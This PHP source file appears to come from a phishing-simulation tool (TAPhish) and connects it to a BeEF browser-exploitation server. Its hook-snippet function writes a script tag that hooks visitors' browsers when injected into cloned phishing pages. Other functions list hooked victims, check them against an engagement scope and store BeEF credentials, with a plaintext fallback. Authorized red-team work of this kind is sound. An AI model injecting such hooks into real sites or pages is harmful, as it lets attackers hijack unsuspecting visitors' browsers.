<?php
/**
 * Phase 3.52: BeEF integration — pure helpers.
 *
 * TAPhish is a SURFACE for an operator's existing BeEF instance, not
 * a wrapper that runs offensive modules. This file ships:
 *
 *  - beef_hook_snippet()                — async <script> tag the
 *                                         SiteCloner injects into a
 *                                         cloned landing page when the
 *                                         per-clone hook toggle is on
 *  - beef_parse_auth_response()         — pure parser for the response
 *                                         to POST /api/admin/login
 *  - beef_summarize_hooks()             — pure reducer over the
 *                                         GET /api/hooks payload into
 *                                         the shape the dashboard renders
 *  - beef_validate_browser_in_scope()   — checks a hooked browser's
 *                                         domain against the
 *                                         engagement.scope_allowlist
 *                                         so out-of-scope hooks get
 *                                         flagged + audit-logged
 *  - beef_list_hooked_browsers()        — thin wrapper that wires the
 *                                         HTTP call + parser; the HTTP
 *                                         transport is an injectable
 *                                         seam so tests stay offline
 *
 * No module-execution code lives here. By design.
 *
 * Hard requirements that downstream tasks rely on (Phase 3.52 plan,
 * "Threat model + non-goals"):
 *
 *   - Hook snippet is async + non-blocking so the landing page still
 *     works when the BeEF server is down.
 *   - Snippet rejects non-http(s) URLs (no javascript: / data: / ftp:).
 *   - Scope check must reject suffix collisions like "evil-acme.com"
 *     against scope "acme.com".
 *   - All HTTP goes through the injectable seam so tests don't touch
 *     the network.
 *
 * Tested in isolation in tests/BeefIntegrationTest.php.
 */

if (!function_exists('beef_hook_snippet')) {
    /**
     * Build the async <script> tag the SiteCloner injects before
     * </body> on a cloned landing page. Empty string on any invalid
     * input so the cloner can no-op safely.
     */
    function beef_hook_snippet(string $baseUrl, string $hookFile = 'hook.js'): string
    {
        $baseUrl = trim($baseUrl);
        if ($baseUrl === '' || !preg_match('#^https?://#i', $baseUrl)) {
            return '';
        }
        $url = rtrim($baseUrl, '/') . '/' . ltrim(trim($hookFile), '/');
        $u   = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
        return '<script async src="' . $u . '"></script>';
    }
}

if (!function_exists('beef_parse_auth_response')) {
    /**
     * Reduce the POST /api/admin/login response to either the session
     * token string or null. Accepts the raw HTTP body (string) or a
     * pre-decoded array.
     *
     * Successful shape (BeEF 0.5.x):
     *   {"success":"true","token":"<32-char-hex>"}
     *
     * Treats any of these as failure: non-JSON body, success false,
     * missing/empty token field, null input.
     *
     * @param string|array|null $raw
     */
    function beef_parse_auth_response($raw): ?string
    {
        if ($raw === null) return null;
        if (is_string($raw)) {
            $j = json_decode($raw, true);
            if (!is_array($j)) return null;
            $raw = $j;
        }
        if (!is_array($raw)) return null;
        $ok = $raw['success'] ?? false;
        // BeEF historically returns the string "true", recent builds the bool.
        if ($ok !== true && $ok !== 'true' && $ok !== 1) return null;
        $tok = isset($raw['token']) ? (string) $raw['token'] : '';
        return $tok !== '' ? $tok : null;
    }
}

if (!function_exists('beef_summarize_hooks')) {
    /**
     * Reduce the GET /api/hooks payload to the dashboard shape.
     *
     * Input shape (BeEF 0.5.x):
     *   {"hooked-browsers": {
     *      "online":  {"<id>": {ip, domain, os, browser, browser.version, …}, …},
     *      "offline": {"<id>": {…}, …}
     *   }}
     *
     * We surface only the `online` set — offline hooks aren't actionable.
     *
     * Output rows:
     *   [{id, ip, domain, os, browser}, …]
     *
     * @param array $raw decoded JSON
     * @return array<int, array{id:string, ip:string, domain:string, os:string, browser:string}>
     */
    function beef_summarize_hooks(array $raw): array
    {
        $online = $raw['hooked-browsers']['online'] ?? [];
        if (!is_array($online)) return [];
        $out = [];
        foreach ($online as $id => $b) {
            if (!is_array($b)) continue;
            $browser = trim((string) ($b['browser'] ?? ''));
            $ver     = trim((string) ($b['browser.version'] ?? ''));
            $label   = $ver !== '' ? trim($browser . ' ' . $ver) : $browser;
            $out[] = [
                'id'      => (string) $id,
                'ip'      => (string) ($b['ip'] ?? ''),
                'domain'  => (string) ($b['domain'] ?? ''),
                'os'      => (string) ($b['os'] ?? ''),
                'browser' => $label,
            ];
        }
        return $out;
    }
}

if (!function_exists('beef_validate_browser_in_scope')) {
    /**
     * True iff the hooked browser's `domain` is one of the engagement's
     * scope_allowlist entries (exact) or a subdomain of one of them.
     * Rejects suffix collisions like "evil-acme.com" against "acme.com"
     * by requiring the '.' separator on subdomain matches.
     *
     * @param array $browser   one row from beef_summarize_hooks()
     * @param array $scopeAllowlist  array of allowed root domains
     * @return array{in_scope: bool, reason: string}
     */
    function beef_validate_browser_in_scope(array $browser, array $scopeAllowlist): array
    {
        $domain = strtolower(trim((string) ($browser['domain'] ?? '')));
        if ($domain === '') {
            return ['in_scope' => false, 'reason' => 'no domain'];
        }
        foreach ($scopeAllowlist as $allowed) {
            $a = strtolower(trim((string) $allowed));
            if ($a === '') continue;
            if ($domain === $a || str_ends_with($domain, '.' . $a)) {
                return ['in_scope' => true, 'reason' => ''];
            }
        }
        return ['in_scope' => false, 'reason' => 'domain not in scope'];
    }
}

if (!function_exists('beef_list_hooked_browsers')) {
    /**
     * GET <base>/api/hooks?token=<session-token>, parse, return either
     * {ok:true, hooks:[…]} or {ok:false, err:'…'}.
     *
     * The $http argument is an injectable HTTP seam used by tests so we
     * never touch the network in unit tests. Production callers pass
     * null and the default cURL transport runs.
     *
     * @param callable|null $http  function ($method, $url, $opts) => ['status'=>int, 'body'=>string]
     * @return array{ok: bool, hooks?: array, err?: string}
     */
    function beef_list_hooked_browsers(string $baseUrl, string $token, ?callable $http = null): array
    {
        $base = rtrim(trim($baseUrl), '/');
        if ($base === '' || !preg_match('#^https?://#i', $base)) {
            return ['ok' => false, 'err' => 'Invalid BeEF base URL'];
        }
        if (trim($token) === '') {
            return ['ok' => false, 'err' => 'Missing session token'];
        }
        $url = $base . '/api/hooks?token=' . rawurlencode($token);
        $fn  = $http ?? 'beef_default_http';
        $resp = $fn('GET', $url, ['timeout' => 5]);
        $status = (int) ($resp['status'] ?? 0);
        if ($status === 0) {
            return ['ok' => false, 'err' => 'BeEF unreachable (transport failure)'];
        }
        if ($status !== 200) {
            return ['ok' => false, 'err' => 'HTTP ' . $status];
        }
        $body = (string) ($resp['body'] ?? '');
        $j = json_decode($body, true);
        if (!is_array($j)) {
            return ['ok' => false, 'err' => 'non-JSON response from BeEF'];
        }
        return ['ok' => true, 'hooks' => beef_summarize_hooks($j)];
    }
}

if (!function_exists('beef_default_http')) {
    /**
     * Default HTTP transport for beef_list_hooked_browsers() and the
     * upcoming beef_authenticate() in Task 2. Short timeouts so the
     * dashboard widget never blocks the operator's tab.
     *
     * Returns {status, body} — same shape the injectable seam uses so
     * tests can mock it 1:1.
     */
    function beef_default_http(string $method, string $url, array $opts = []): array
    {
        if (!function_exists('curl_init')) {
            return ['status' => 0, 'body' => ''];
        }
        $ch = curl_init($url);
        if ($ch === false) return ['status' => 0, 'body' => ''];
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CUSTOMREQUEST  => strtoupper($method),
            CURLOPT_TIMEOUT        => (int) ($opts['timeout'] ?? 5),
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_USERAGENT      => (defined('BRAND_PRODUCT_NAME') ? BRAND_PRODUCT_NAME : 'TAPhish') . '/beef',
            CURLOPT_HTTPHEADER     => ['Accept: application/json'],
        ]);
        if (isset($opts['body'])) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $opts['body']);
        }
        $body   = curl_exec($ch);
        $status = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return [
            'status' => $status,
            'body'   => is_string($body) ? $body : '',
        ];
    }
}

// ---- Phase 3.52 task 2: settings storage + authentication ---------------

if (!function_exists('beef_authenticate')) {
    /**
     * POST <base>/api/admin/login with the operator's BeEF username +
     * password; return the session token on success, null otherwise.
     *
     * BeEF's REST auth flow is username/password → session-token, not
     * a static API key. We do the login per dashboard poll so the
     * token never has to be persisted (BeEF rotates it across server
     * restarts anyway).
     *
     * HTTP via the injectable seam used by beef_list_hooked_browsers().
     *
     * @return array{ok: bool, token?: string, err?: string}
     */
    function beef_authenticate(string $baseUrl, string $username, string $password, ?callable $http = null): array
    {
        $base = rtrim(trim($baseUrl), '/');
        if ($base === '' || !preg_match('#^https?://#i', $base)) {
            return ['ok' => false, 'err' => 'Invalid BeEF base URL'];
        }
        if (trim($username) === '' || $password === '') {
            return ['ok' => false, 'err' => 'Missing BeEF credentials'];
        }
        $body = json_encode(['username' => $username, 'password' => $password]);
        if ($body === false) {
            return ['ok' => false, 'err' => 'Could not encode credentials'];
        }
        $fn   = $http ?? 'beef_default_http';
        $resp = $fn('POST', $base . '/api/admin/login', [
            'timeout' => 5,
            'body'    => $body,
        ]);
        $status = (int) ($resp['status'] ?? 0);
        if ($status === 0) {
            return ['ok' => false, 'err' => 'BeEF unreachable (transport failure)'];
        }
        if ($status === 401 || $status === 403) {
            return ['ok' => false, 'err' => 'BeEF rejected credentials'];
        }
        if ($status !== 200) {
            return ['ok' => false, 'err' => 'HTTP ' . $status];
        }
        $tok = beef_parse_auth_response((string) ($resp['body'] ?? ''));
        if ($tok === null) {
            return ['ok' => false, 'err' => 'BeEF response missing session token'];
        }
        return ['ok' => true, 'token' => $tok];
    }
}

if (!function_exists('beef_settings_serialize')) {
    /**
     * Pure serializer for the (base_url, username, password) triple
     * the operator types on SettingsBeefIntegration. Output is the
     * exact JSON string the at-rest envelope encrypts.
     *
     * Kept pure so the round-trip can be tested without mysqli or the
     * envelope (Phase 3.38).
     */
    function beef_settings_serialize(string $baseUrl, string $username, string $password): string
    {
        return (string) json_encode([
            'base_url' => trim($baseUrl),
            'username' => trim($username),
            'password' => $password,
        ], JSON_UNESCAPED_SLASHES);
    }
}

if (!function_exists('beef_settings_deserialize')) {
    /**
     * Inverse of beef_settings_serialize(). Returns null on any shape
     * the storage layer didn't write itself (i.e. a manual tb_store
     * row from before this code shipped).
     */
    function beef_settings_deserialize(?string $payload): ?array
    {
        if ($payload === null || $payload === '') return null;
        $j = json_decode($payload, true);
        if (!is_array($j)) return null;
        if (!isset($j['base_url'], $j['username'], $j['password'])) return null;
        return [
            'base_url' => (string) $j['base_url'],
            'username' => (string) $j['username'],
            'password' => (string) $j['password'],
        ];
    }
}

if (!function_exists('beef_settings_mask_password')) {
    /**
     * Render a never-leaks placeholder for the password field. The
     * dispatcher's `beef_settings_load` action returns this; the full
     * password never goes back to the browser after it's stored.
     */
    function beef_settings_mask_password(string $password): string
    {
        if ($password === '') return '';
        $len = strlen($password);
        return str_repeat('•', min(8, max(4, $len)));
    }
}

if (!function_exists('beef_settings_save')) {
    /**
     * Upsert the encrypted settings row into tb_store
     * (type='beef_integration', name='credentials'). Mirrors the
     * Phase 3.42 capture_webhook pattern. Encryption is opportunistic:
     * if the at-rest envelope (Phase 3.38) is unavailable we fall back
     * to plaintext — same posture as the rest of the codebase, so a
     * fresh install without the key still works.
     *
     * @return bool whether the row was successfully written
     */
    function beef_settings_save(\mysqli $conn, string $baseUrl, string $username, string $password): bool
    {
        $payload = beef_settings_serialize($baseUrl, $username, $password);
        if (function_exists('secret_at_rest_get_key') && function_exists('secret_at_rest_encrypt')) {
            $key = secret_at_rest_get_key();
            if ($key !== null) {
                $enc = secret_at_rest_encrypt($payload, $key);
                if ($enc !== null) $payload = $enc;
            }
        }
        $del = $conn->prepare("DELETE FROM tb_store WHERE type='beef_integration' AND name='credentials'");
        if ($del !== false) {
            $del->execute();
            $del->close();
        }
        $ins = $conn->prepare(
            "INSERT INTO tb_store (type, name, info, content) VALUES ('beef_integration', 'credentials', 'Phase 3.52 BeEF integration credentials', ?)"
        );
        if ($ins === false) return false;
        $ins->bind_param('s', $payload);
        $ok = $ins->execute();
        $ins->close();
        return (bool) $ok;
    }
}

if (!function_exists('beef_settings_load')) {
    /**
     * Read the (base_url, username, password) triple back from
     * tb_store. Transparently decrypts via the Phase 3.38 envelope's
     * passthrough decrypt — works on both encrypted and legacy
     * plaintext rows.
     *
     * @return array{base_url:string, username:string, password:string}|null
     */
    function beef_settings_load(\mysqli $conn): ?array
    {
        $stmt = $conn->prepare(
            "SELECT content FROM tb_store WHERE type='beef_integration' AND name='credentials'"
        );
        if ($stmt === false) return null;
        $stmt->execute();
        $row = $stmt->get_result()->fetch_assoc();
        $stmt->close();
        if (!$row || empty($row['content'])) return null;
        $payload = (string) $row['content'];
        if (function_exists('secret_at_rest_get_key') && function_exists('secret_at_rest_passthrough_decrypt')) {
            $key = secret_at_rest_get_key();
            if ($key !== null) {
                $plain = secret_at_rest_passthrough_decrypt($payload, $key);
                if (is_string($plain)) $payload = $plain;
            }
        }
        return beef_settings_deserialize($payload);
    }
}

if (!function_exists('beef_settings_delete')) {
    /**
     * Forget the stored settings row entirely. Used when the operator
     * pastes an empty URL in the settings UI.
     */
    function beef_settings_delete(\mysqli $conn): bool
    {
        $del = $conn->prepare("DELETE FROM tb_store WHERE type='beef_integration' AND name='credentials'");
        if ($del === false) return false;
        $ok = $del->execute();
        $del->close();
        return (bool) $ok;
    }
}
